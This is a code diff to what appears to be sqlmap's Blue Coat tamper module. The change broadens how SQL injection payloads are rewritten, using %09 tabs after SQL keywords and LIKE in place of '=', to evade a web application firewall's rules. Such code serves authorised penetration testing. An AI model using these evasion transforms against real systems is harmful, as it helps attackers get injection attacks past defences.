@@ -7,6 +7,7 @@ See the file 'doc/COPYING' for copying permission
 
 import re
 
+from lib.core.data import kb
 from lib.core.enums import PRIORITY
 
 __priority__ = PRIORITY.NORMAL
@@ -29,14 +30,22 @@ def tamper(payload, **kwargs):
     Notes:
         * Useful to bypass Blue Coat's recommended WAF rule configuration
 
-    >>> tamper('SELECT id FROM users where id = 1')
-    'SELECT%09id FROM users where id LIKE 1'
+    >>> tamper('SELECT id FROM users WHERE id = 1')
+    'SELECT%09id FROM%09users WHERE%09id LIKE 1'
     """
+
+    def process(match):
+        word = match.group('word')
+        if word.upper() in kb.keywords:
+            return match.group().replace(word, "%s%%09" % word)
+        else:
+            return match.group()
 
     retVal = payload
 
     if payload:
-        retVal = re.sub(r"(?i)(SELECT|UPDATE|INSERT|DELETE)\s+", r"\g<1>%09", payload)
+        retVal = re.sub(r"\b(?P<word>[A-Z_]+)(?=[^\w(]|\Z)", lambda match: process(match), retVal)
         retVal = re.sub(r"\s*=\s*", " LIKE ", retVal)
+        retVal = retVal.replace("%09 ", "%09")
 
     return retVal
